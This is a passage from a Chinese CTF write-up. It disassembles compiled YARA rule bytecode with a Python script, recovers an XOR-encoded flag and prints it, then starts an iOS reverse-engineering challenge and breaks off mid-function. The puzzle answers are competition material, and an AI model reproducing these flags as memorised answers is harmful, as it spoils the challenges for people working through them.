class="number">0</span>] <span class="operator">+</span> <span class="number">0xC1</span> <span class="operator">=</span><span class="operator">=</span> <span class="number">0xCA</span>) <span class="keyword">and</span></span><br><span class="line">        (<span class="variable">@a</span>[<span class="number">0</span>] <span class="operator">-</span> <span class="number">0xC1</span> <span class="operator">=</span><span class="operator">=</span> <span class="number">0xCA</span>) <span class="keyword">and</span></span><br><span class="line">        (<span class="variable">@a</span>[<span class="number">0</span>] <span class="operator">*</span> <span class="number">0xC1</span> <span class="operator">=</span><span class="operator">=</span> <span class="number">0xCA</span>) <span class="keyword">and</span></span><br><span class="line">        (<span class="variable">@a</span>[<span class="number">0</span>] <span class="operator">^</span> <span class="number">0xC1</span> <span class="operator">=</span><span class="operator">=</span> <span class="number">0xCA</span>) <span class="keyword">and</span></span><br><span class="line">        (<span class="variable">@a</span>[<span class="number">0</span>] <span class="operator">*</span> <span class="number">0xC1</span> <span class="operator">=</span><span class="operator">=</span> <span class="number">0xCA</span>) <span class="keyword">and</span></span><br><span class="line">        (<span class="variable">@a</span>[<span class="number">0</span>] <span class="operator">^</span> <span class="number">0xC1</span> <span class="operator">=</span><span class="operator">=</span> <span class="number">0xCA</span>) <span class="keyword">and</span></span><br><span class="line">        (<span class="variable">@a</span>[<span class="number">0</span>] <span class="operator">&amp;</span> <span class="number">0xC1</span> <span class="operator">=</span><span class="operator">=</span> <span class="number">0xCA</span>) <span class="keyword">and</span></span><br><span class="line">        (<span class="variable">@a</span>[<span class="number">0</span>] <span class="operator">|</span> <span class="number">0xC1</span> <span class="operator">=</span><span class="operator">=</span> <span class="number">0xCA</span>) <span class="keyword">and</span></span><br><span class="line">        (<span class="variable">@a</span>[<span class="number">0</span>] <span class="operator">&amp;</span> <span class="number">0xC1</span> <span class="operator">=</span><span class="operator">=</span> <span class="number">0xCA</span>) <span class="keyword">and</span></span><br><span class="line">        (<span class="variable">@a</span>[<span class="number">0</span>] <span class="operator">|</span> <span class="number">0xC1</span> <span class="operator">=</span><span class="operator">=</span> <span class="number">0xCA</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成的二进制文件的hex：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">3C 01 00 00 00 00 00 00 0D 03 00 00 00 00 00 00</span><br><span class="line">00 16 2F 18 00 00 00 3F 00 0D 03 00 00 00 00 00</span><br><span class="line">00 00 19 3F C1 6A 3F CA 64 01 2F 18 00 00 00 3F</span><br><span class="line">00 0D 03 00 00 00 00 00 00 00 19 3F C1 6B 3F CA</span><br><span class="line">64 01 2F 18 00 00 00 3F 00 0D 03 00 00 00 00 00</span><br><span class="line">00 00 19 3F C1 6A 3F CA 64 01 2F 18 00 00 00 3F</span><br><span class="line">00 0D 03 00 00 00 00 00 00 00 19 3F C1 6B 3F CA</span><br><span class="line">64 01 2F 18 00 00 00 3F 00 0D 03 00 00 00 00 00</span><br><span class="line">00 00 19 3F C1 6C 3F CA 64 01 2F 18 00 00 00 3F</span><br><span class="line">00 0D 03 00 00 00 00 00 00 00 19 3F C1 07 3F CA</span><br><span class="line">64 01 2F 18 00 00 00 3F 00 0D 03 00 00 00 00 00</span><br><span class="line">00 00 19 3F C1 6C 3F CA 64 01 2F 18 00 00 00 3F</span><br><span class="line">00 0D 03 00 00 00 00 00 00 00 19 3F C1 07 3F CA</span><br><span class="line">64 01 2F 18 00 00 00 3F 00 0D 03 00 00 00 00 00</span><br><span class="line">00 00 19 3F C1 05 3F CA 64 01 2F 18 00 00 00 3F</span><br><span class="line">00 0D 03 00 00 00 00 00 00 00 19 3F C1 06 3F CA</span><br><span class="line">64 01 2F 18 00 00 00 3F 00 0D 03 00 00 00 00 00</span><br><span class="line">00 00 19 3F C1 05 3F CA 64 01 2F 18 00 00 00 3F</span><br><span class="line">00 0D 03 00 00 00 00 00 00 00 19 3F C1 06 3F CA</span><br><span class="line">64 01 1D 00 00 00 00 00 00 00 00 FF</span><br></pre></td></tr></table></figure>

<p>结合yara的libyara源代码中的exec.h写虚拟机解析脚本，即YARA 虚拟机字节码的反汇编器。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">opcode_map = &#123;</span><br><span class="line">    <span class="number">0x01</span>: <span class="string">&quot;OP_AND&quot;</span>,</span><br><span class="line">    <span class="number">0x02</span>: <span class="string">&quot;OP_OR&quot;</span>,</span><br><span class="line">    <span class="number">0x03</span>: <span class="string">&quot;OP_NOT&quot;</span>,</span><br><span class="line">    <span class="number">0x04</span>: <span class="string">&quot;OP(~)&quot;</span>,</span><br><span class="line">    <span class="number">0x05</span>: <span class="string">&quot;OP(&amp;)&quot;</span>,</span><br><span class="line">    <span class="number">0x06</span>: <span class="string">&quot;OP(|)&quot;</span>,</span><br><span class="line">    <span class="number">0x07</span>: <span class="string">&quot;OP(^)&quot;</span>,</span><br><span class="line">    <span class="number">0x08</span>: <span class="string">&quot;OP_SHL&quot;</span>,</span><br><span class="line">    <span class="number">0x09</span>: <span class="string">&quot;OP_SHR&quot;</span>,</span><br><span class="line">    <span class="number">0x0A</span>: <span class="string">&quot;OP_MOD&quot;</span>,</span><br><span class="line">    <span class="number">0x0B</span>: <span class="string">&quot;OP_INT_TO_DBL&quot;</span>,</span><br><span class="line">    <span class="number">0x0C</span>: <span class="string">&quot;OP_STR_TO_BOOL&quot;</span>,</span><br><span class="line">    <span class="number">0x0D</span>: <span class="string">&quot;OP_PUSH&quot;</span>,</span><br><span class="line">    <span class="number">0x0E</span>: <span class="string">&quot;OP_POP&quot;</span>,</span><br><span class="line">    <span class="number">0x0F</span>: <span class="string">&quot;OP_CALL&quot;</span>,</span><br><span class="line">    <span class="number">0x10</span>: <span class="string">&quot;OP_OBJ_LOAD&quot;</span>,</span><br><span class="line">    <span class="number">0x11</span>: <span class="string">&quot;OP_OBJ_VALUE&quot;</span>,</span><br><span class="line">    <span class="number">0x12</span>: <span class="string">&quot;OP_OBJ_FIELD&quot;</span>,</span><br><span class="line">    <span class="number">0x13</span>: <span class="string">&quot;OP_INDEX_ARRAY&quot;</span>,</span><br><span class="line">    <span class="number">0x14</span>: <span class="string">&quot;OP_COUNT&quot;</span>,</span><br><span class="line">    <span class="number">0x15</span>: <span class="string">&quot;OP_LENGTH&quot;</span>,</span><br><span class="line">    <span class="number">0x16</span>: <span class="string">&quot;OP_FOUND&quot;</span>,</span><br><span class="line">    <span class="number">0x17</span>: <span class="string">&quot;OP_FOUND_AT&quot;</span>,</span><br><span class="line">    <span class="number">0x18</span>: <span class="string">&quot;OP_FOUND_IN&quot;</span>,</span><br><span class="line">    <span class="number">0x19</span>: <span class="string">&quot;OP_OFFSET&quot;</span>,</span><br><span class="line">    <span class="number">0x1A</span>: <span class="string">&quot;OP_OF&quot;</span>,</span><br><span class="line">    <span class="number">0x1B</span>: <span class="string">&quot;OP_PUSH_RULE&quot;</span>,</span><br><span class="line">    <span class="number">0x1C</span>: <span class="string">&quot;OP_INIT_RULE&quot;</span>,</span><br><span class="line">    <span class="number">0x1D</span>: <span class="string">&quot;OP_MATCH_RULE&quot;</span>,</span><br><span class="line">    <span class="number">0x1E</span>: <span class="string">&quot;OP_INCR_M&quot;</span>,</span><br><span class="line">    <span class="number">0x1F</span>: <span class="string">&quot;OP_CLEAR_M&quot;</span>,</span><br><span class="line">    <span class="number">0x20</span>: <span class="string">&quot;OP_ADD_M&quot;</span>,</span><br><span class="line">    <span class="number">0x21</span>: <span class="string">&quot;OP_POP_M&quot;</span>,</span><br><span class="line">    <span class="number">0x22</span>: <span class="string">&quot;OP_PUSH_M&quot;</span>,</span><br><span class="line">    <span class="number">0x23</span>: <span class="string">&quot;OP_SET_M&quot;</span>,</span><br><span class="line">    <span class="number">0x24</span>: <span class="string">&quot;OP_SWAPUNDEF&quot;</span>,</span><br><span class="line">    <span class="number">0x25</span>: <span class="string">&quot;OP_FILESIZE&quot;</span>,</span><br><span class="line">    <span class="number">0x26</span>: <span class="string">&quot;OP_ENTRYPOINT&quot;</span>,</span><br><span class="line">    <span class="number">0x27</span>: <span class="string">&quot;OP_UNUSED&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>: <span class="string">&quot;OP_MATCHES&quot;</span>,</span><br><span class="line">    <span class="number">0x29</span>: <span class="string">&quot;OP_IMPORT&quot;</span>,</span><br><span class="line">    <span class="number">0x2A</span>: <span class="string">&quot;OP_LOOKUP_DICT&quot;</span>,</span><br><span class="line">    <span class="number">0x2B</span>: <span class="string">&quot;OP_JUNDEF&quot;</span>,</span><br><span class="line">    <span class="number">0x2C</span>: <span class="string">&quot;OP_JUNDEF_P&quot;</span>,</span><br><span class="line">    <span class="number">0x2D</span>: <span class="string">&quot;OP_JNUNDEF&quot;</span>,</span><br><span class="line">    <span class="number">0x2E</span>: <span class="string">&quot;OP_JNUNDEF_P&quot;</span>,</span><br><span class="line">    <span class="number">0x2F</span>: <span class="string">&quot;OP_JFALSE&quot;</span>,</span><br><span class="line">    <span class="number">0x30</span>: <span class="string">&quot;OP_JFALSE_P&quot;</span>,</span><br><span class="line">    <span class="number">0x31</span>: <span class="string">&quot;OP_JTRUE&quot;</span>,</span><br><span class="line">    <span class="number">0x32</span>: <span class="string">&quot;OP_JTRUE_P&quot;</span>,</span><br><span class="line">    <span class="number">0x33</span>: <span class="string">&quot;OP_JL_P&quot;</span>,</span><br><span class="line">    <span class="number">0x34</span>: <span class="string">&quot;OP_JLE_P&quot;</span>,</span><br><span class="line">    <span class="number">0x35</span>: <span class="string">&quot;OP_ITER_NEXT&quot;</span>,</span><br><span class="line">    <span class="number">0x36</span>: <span class="string">&quot;OP_ITER_START_ARRAY&quot;</span>,</span><br><span class="line">    <span class="number">0x37</span>: <span class="string">&quot;OP_ITER_START_DICT&quot;</span>,</span><br><span class="line">    <span class="number">0x38</span>: <span class="string">&quot;OP_ITER_START_INT_RANGE&quot;</span>,</span><br><span class="line">    <span class="number">0x39</span>: <span class="string">&quot;OP_ITER_START_INT_ENUM&quot;</span>,</span><br><span class="line">    <span class="number">0x3A</span>: <span class="string">&quot;OP_ITER_START_STRING_SET&quot;</span>,</span><br><span class="line">    <span class="number">0x3B</span>: <span class="string">&quot;OP_ITER_CONDITION&quot;</span>,</span><br><span class="line">    <span class="number">0x3C</span>: <span class="string">&quot;OP_ITER_END&quot;</span>,</span><br><span class="line">    <span class="number">0x3D</span>: <span class="string">&quot;OP_JZ&quot;</span>,</span><br><span class="line">    <span class="number">0x3E</span>: <span class="string">&quot;OP_JZ_P&quot;</span>,</span><br><span class="line">    <span class="number">0x3F</span>: <span class="string">&quot;OP_PUSH_8&quot;</span>,</span><br><span class="line">    <span class="number">0x40</span>: <span class="string">&quot;OP_PUSH_16&quot;</span>,</span><br><span class="line">    <span class="number">0x41</span>: <span class="string">&quot;OP_PUSH_32&quot;</span>,</span><br><span class="line">    <span class="number">0x42</span>: <span class="string">&quot;OP_PUSH_U&quot;</span>,</span><br><span class="line">    <span class="number">0x43</span>: <span class="string">&quot;OP_CONTAINS&quot;</span>,</span><br><span class="line">    <span class="number">0x44</span>: <span class="string">&quot;OP_STARTSWITH&quot;</span>,</span><br><span class="line">    <span class="number">0x45</span>: <span class="string">&quot;OP_ENDSWITH&quot;</span>,</span><br><span class="line">    <span class="number">0x46</span>: <span class="string">&quot;OP_ICONTAINS&quot;</span>,</span><br><span class="line">    <span class="number">0x47</span>: <span class="string">&quot;OP_ISTARTSWITH&quot;</span>,</span><br><span class="line">    <span class="number">0x48</span>: <span class="string">&quot;OP_IENDSWITH&quot;</span>,</span><br><span class="line">    <span class="number">0x49</span>: <span class="string">&quot;OP_IEQUALS&quot;</span>,</span><br><span class="line">    <span class="number">0x4A</span>: <span class="string">&quot;OP_OF_PERCENT&quot;</span>,</span><br><span class="line">    <span class="number">0x4B</span>: <span class="string">&quot;OP_OF_FOUND_IN&quot;</span>,</span><br><span class="line">    <span class="number">0x4C</span>: <span class="string">&quot;OP_COUNT_IN&quot;</span>,</span><br><span class="line">    <span class="number">0x4D</span>: <span class="string">&quot;OP_DEFINED&quot;</span>,</span><br><span class="line">    <span class="number">0x4E</span>: <span class="string">&quot;OP_ITER_START_TEXT_STRING_SET&quot;</span>,</span><br><span class="line">    <span class="number">0x4F</span>: <span class="string">&quot;OP_OF_FOUND_AT&quot;</span>,</span><br><span class="line">    <span class="number">100</span>: <span class="string">&quot;OP(==)&quot;</span>,</span><br><span class="line">    <span class="number">101</span>: <span class="string">&quot;OP(!=)&quot;</span>,</span><br><span class="line">    <span class="number">102</span>: <span class="string">&quot;OP(&lt;)&quot;</span>,</span><br><span class="line">    <span class="number">103</span>: <span class="string">&quot;OP(&gt;)&quot;</span>,</span><br><span class="line">    <span class="number">104</span>: <span class="string">&quot;OP(&lt;=)&quot;</span>,</span><br><span class="line">    <span class="number">105</span>: <span class="string">&quot;OP(&gt;=)&quot;</span>,</span><br><span class="line">    <span class="number">106</span>: <span class="string">&quot;OP(+)&quot;</span>,</span><br><span class="line">    <span class="number">107</span>: <span class="string">&quot;OP(-)&quot;</span>,</span><br><span class="line">    <span class="number">108</span>: <span class="string">&quot;OP(*)&quot;</span>,</span><br><span class="line">    <span class="number">109</span>: <span class="string">&quot;OP(/)&quot;</span>,</span><br><span class="line">    <span class="number">110</span>: <span class="string">&quot;OP_INT_MINUS&quot;</span>,</span><br><span class="line">    <span class="number">120</span>: <span class="string">&quot;OP_DBL_EQ&quot;</span>,</span><br><span class="line">    <span class="number">121</span>: <span class="string">&quot;OP_DBL_NEQ&quot;</span>,</span><br><span class="line">    <span class="number">122</span>: <span class="string">&quot;OP_DBL_LT&quot;</span>,</span><br><span class="line">    <span class="number">123</span>: <span class="string">&quot;OP_DBL_GT&quot;</span>,</span><br><span class="line">    <span class="number">124</span>: <span class="string">&quot;OP_DBL_LE&quot;</span>,</span><br><span class="line">    <span class="number">125</span>: <span class="string">&quot;OP_DBL_GE&quot;</span>,</span><br><span class="line">    <span class="number">126</span>: <span class="string">&quot;OP_DBL_ADD&quot;</span>,</span><br><span class="line">    <span class="number">127</span>: <span class="string">&quot;OP_DBL_SUB&quot;</span>,</span><br><span class="line">    <span class="number">128</span>: <span class="string">&quot;OP_DBL_MUL&quot;</span>,</span><br><span class="line">    <span class="number">129</span>: <span class="string">&quot;OP_DBL_DIV&quot;</span>,</span><br><span class="line">    <span class="number">130</span>: <span class="string">&quot;OP_DBL_MINUS&quot;</span>,</span><br><span class="line">    <span class="number">140</span>: <span class="string">&quot;OP_STR_EQ&quot;</span>,</span><br><span class="line">    <span class="number">141</span>: <span class="string">&quot;OP_STR_NEQ&quot;</span>,</span><br><span class="line">    <span class="number">142</span>: <span class="string">&quot;OP_STR_LT&quot;</span>,</span><br><span class="line">    <span class="number">143</span>: <span class="string">&quot;OP_STR_GT&quot;</span>,</span><br><span class="line">    <span class="number">144</span>: <span class="string">&quot;OP_STR_LE&quot;</span>,</span><br><span class="line">    <span class="number">145</span>: <span class="string">&quot;OP_STR_GE&quot;</span>,</span><br><span class="line">    <span class="number">240</span>: <span class="string">&quot;OP_INT8&quot;</span>,</span><br><span class="line">    <span class="number">241</span>: <span class="string">&quot;OP_INT16&quot;</span>,</span><br><span class="line">    <span class="number">242</span>: <span class="string">&quot;OP_INT32&quot;</span>,</span><br><span class="line">    <span class="number">243</span>: <span class="string">&quot;OP_UINT8&quot;</span>,</span><br><span class="line">    <span class="number">244</span>: <span class="string">&quot;OP_UINT16&quot;</span>,</span><br><span class="line">    <span class="number">245</span>: <span class="string">&quot;OP_UINT32&quot;</span>,</span><br><span class="line">    <span class="number">246</span>: <span class="string">&quot;OP_INT8BE&quot;</span>,</span><br><span class="line">    <span class="number">247</span>: <span class="string">&quot;OP_INT16BE&quot;</span>,</span><br><span class="line">    <span class="number">248</span>: <span class="string">&quot;OP_INT32BE&quot;</span>,</span><br><span class="line">    <span class="number">249</span>: <span class="string">&quot;OP_UINT8BE&quot;</span>,</span><br><span class="line">    <span class="number">250</span>: <span class="string">&quot;OP_UINT16BE&quot;</span>,</span><br><span class="line">    <span class="number">251</span>: <span class="string">&quot;OP_UINT32BE&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opcode_name_map = &#123;v: k <span class="keyword">for</span> k, v <span class="keyword">in</span> opcode_map.items()&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">disassemble_yara_bytecode</span>(<span class="params">bytecode: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Off  | Opcode / Data&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----|-----------------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(bytecode):</span><br><span class="line">        byte = bytecode[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> byte == <span class="number">0x00</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> byte == <span class="number">0x3F</span>:</span><br><span class="line">            <span class="keyword">if</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(bytecode):</span><br><span class="line">                value = bytecode[i + <span class="number">1</span>]</span><br><span class="line">                addr = bytecode[i + <span class="number">2</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i:04d&#125;</span> | OP_PUSH_8 (value: 0x<span class="subst">&#123;value:02X&#125;</span>)&quot;</span>)</span><br><span class="line">                i += <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i:04d&#125;</span> | OP_PUSH_8 (ERROR: Not enough bytes for parameters)&quot;</span>)</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            name = opcode_map.get(byte, <span class="string">f&quot;UNKNOWN (0x<span class="subst">&#123;byte:02X&#125;</span>)&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i:04d&#125;</span> | <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">example_bytecode = <span class="built_in">bytearray</span>.fromhex(<span class="string">&quot;2805000000000000253f2a692f120500003f011f00000000000000001f01000000000000002102000000000000003f00253f2a6b383521030000000000000032c10400002203000000000000003f006af33f803f006a073fe6642f1c0000002203000000000000003f016af33f803f016a073fed64012f1c0000002203000000000000003f026af33f803f026a073fe364012f1c0000002203000000000000003f036af33f803f036a073fe464012f1c0000002203000000000000003f046af33f803f046a073fff64012f1c0000002203000000000000003f056af33f803f056a073fe664012f1c0000002203000000000000003f066af33f803f066a073fe464012f1c0000002203000000000000003f076af33f803f076a073fbe64012f1c0000002203000000000000003f086af33f803f086a073fba64012f1c0000002203000000000000003f096af33f803f096a073fbd64012f1c0000002203000000000000003f0a6af33f803f0a6a073fbb64012f1c0000002203000000000000003f0b6af33f803f0b6a073fb864012f1c0000002203000000000000003f0c6af33f803f0c6a073fbf64012f1c0000002203000000000000003f0d6af33f803f0d6a073fa064012f1c0000002203000000000000003f0e6af33f803f0e6a073fba64012f1c0000002203000000000000003f0f6af33f803f0f6a073fed64012f1c0000002203000000000000003f106af33f803f106a073fa264012f1c0000002203000000000000003f116af33f803f116a073fa664012f1c0000002203000000000000003f126af33f803f126a073fbf64012f1c0000002203000000000000003f136af33f803f136a073fa764012f1c0000002203000000000000003f146af33f803f146a073fac64012f1c0000002203000000000000003f156af33f803f156a073fa364012f1c0000002203000000000000003f166af33f803f166a073fa064012f1c0000002203000000000000003f176af33f803f176a073fba64012f1c0000002203000000000000003f186af33f803f186a073ff964012f1c0000002203000000000000003f196af33f803f196a073faf64012f1c0000002203000000000000003f1a6af33f803f1a6a073fa364012f1c0000002203000000000000003f1b6af33f803f1b6a073faf64012f1c0000002203000000000000003f1c6af33f803f1c6a073fb164012f1c0000002203000000000000003f1d6af33f803f1d6a073faa64012f1c0000002203000000000000003f1e6af33f803f1e6a073ffb64012f1c0000002203000000000000003f1f6af33f803f1f6a073fac64012f1c0000002203000000000000003f206af33f803f206a073fc564012f1c0000002203000000000000003f216af33f803f216a073f9064012f1c0000002203000000000000003f226af33f803f226a073fc364012f1c0000002203000000000000003f236af33f803f236a073fc264012f1c0000002203000000000000003f246af33f803f246a073fc264012f1c0000002203000000000000003f256af33f803f256a073f9c64012f1c0000002203000000000000003f266af33f803f266a073fc264012f1c0000002203000000000000003f276af33f803f276a073fc364012f1c0000002203000000000000003f286af33f803f286a073f9964012f1c0000002203000000000000003f296af33f803f296a073fd464011e01000000000000002200000000000000002202000000000000003b200000000000000000323afbffff0e2201000000000000002200000000000000002202000000000000003c011d0000000000000000ff&quot;</span>)</span><br><span class="line">disassemble_yara_bytecode(example_bytecode)</span><br></pre></td></tr></table></figure>

<p>opcode_map：它是一个字典，把 YARA VM 的 <strong>操作码（opcode 的数值）</strong> 映射到 <strong>可读的名字</strong>。</p>
<p>disassemble_yara_bytecode(bytecode)：一条一条地读 <strong>二进制的 .yac 文件内容</strong>，然后解析出对应的指令。</p>
<p>然后运行得到指令流。</p>
<p>整体逻辑就是：</p>
<ol>
<li>遍历输入（flag）的 0x2A 个字节。</li>
<li>每个字节做异或运算 <code>(flag[i] ^ (0x80 + i))</code>。</li>
<li>和编译在规则里的常量 <code>CONST[i]</code> 比较。</li>
<li>全部成立 → 规则匹配（也就是 flag 正确）。</li>
</ol>
<p>发现加密方式是异或0x80的定值和索引，密文已经给出，编写脚本解密：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">targets = bytearray.fromhex(&quot;E6EDE3E4FFE6E4BEBABDBBB8BFA0BAEDA2A6BFA7ACA3A0BAF9AFA3AFB1AAFBACC590C3C2C29CC2C399D4&quot;)</span><br><span class="line">for i in range(len(targets)):</span><br><span class="line">    targets[i] ^= 0x80</span><br><span class="line">    targets[i] ^= i</span><br><span class="line">print(targets)</span><br></pre></td></tr></table></figure>

<p><strong>flag{cb924133-4b27-4866-a694-7e3e1aaf9dd1}</strong></p>
<h3 id="re"><a href="#re" class="headerlink" title="re!!!"></a>re!!!</h3><p>ios系统逆向，查看字符串发现c2a7c3b9c2acc3a5c2a2c3b6c391c295c2aac38cc28bc38ac2a6c3aec28bc28fc2a1c3aac287c382c2bfc3b6c282c38ec2b9c3a2c2a13cc28ac3adc2b1c280c2b2c384c28dc3bbc283c396c2b03dc28a3bc2b12cc287c3b0c2852bc282c39ac28432c29320c29d21c29ac392c291c3a1c296c3a06d1866396c256310c299c3946931c291c3917a2e470b632a7811730f65c385。</p>
<p>看上去都是c2……..，c3………..</p>
<p>看看这个字符串所在的函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">id __fastcall ViewController.init(nibName:bundle:)(__int64 a1, __int64 a2, <span class="keyword">void</span> *a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// x20</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// x8</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// x8</span></span><br><span class="line">  NSString v8; <span class="comment">// x21</span></span><br><span class="line">  id v9; <span class="comment">// x20</span></span><br><span class="line">  objc_super v11; <span class="comment">// [xsp+0h] [xbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5 = &amp;v3[OBJC_IVAR____TtC9challenge14ViewController_secretKey];</span><br><span class="line">  *(_QWORD *)v5 = 0x616B696875726148LL;</span><br><span class="line">  *((_QWORD *)v5 + <span class="number">1</span>) = 0xEA00000000006567LL;</span><br><span class="line">  v6 = &amp;v3[OBJC_IVAR____TtC9challenge14ViewController_flagHash];</span><br><span class="line">  *(_QWORD *)v6 = 0xD000000000000126LL;</span><br><span class="line">  *((_QWORD *)v6 + <span class="number">1</span>) = 0x8000000100003C20LL;</span><br><span class="line">  *(_QWORD *)&amp;v3[OBJC_IVAR____TtC9challenge14ViewController_magicNumber] = 3735928559LL;</span><br><span class="line">  *(_QWORD *)&amp;v3[OBJC_IVAR____TtC9challenge14ViewController_inputTextField] = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)&amp;v3[OBJC_IVAR____TtC9challenge14ViewController_outputTextField] = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)&amp;v3[OBJC_IVAR____TtC9challenge14ViewController_encryptButton] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = String._bridgeToObjectiveC()();</span><br><span class="line">    a1 = swift_bridgeObjectRelease(a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">  